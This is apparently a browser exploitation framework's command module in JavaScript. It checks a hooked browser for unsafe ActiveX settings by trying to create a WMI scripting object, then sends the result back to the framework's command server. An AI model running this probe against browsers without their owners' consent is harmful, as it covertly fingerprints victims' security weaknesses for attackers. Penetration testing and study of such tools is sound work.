//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var unsafe = true;
	var result = "";
	var test;

	try {
		test = new ActiveXObject("WbemScripting.SWbemLocator");
	} catch (e) {
		unsafe = false;
	}

	test = null;

	if (unsafe) {
		result = "Browser is configured for unsafe ActiveX";
	} else {
		result = "Browser is NOT configured for unsafe ActiveX";
	}

	server.net.send("<%= @command_url %>", <%= @command_id %>, "unsafe_activex="+result);

});

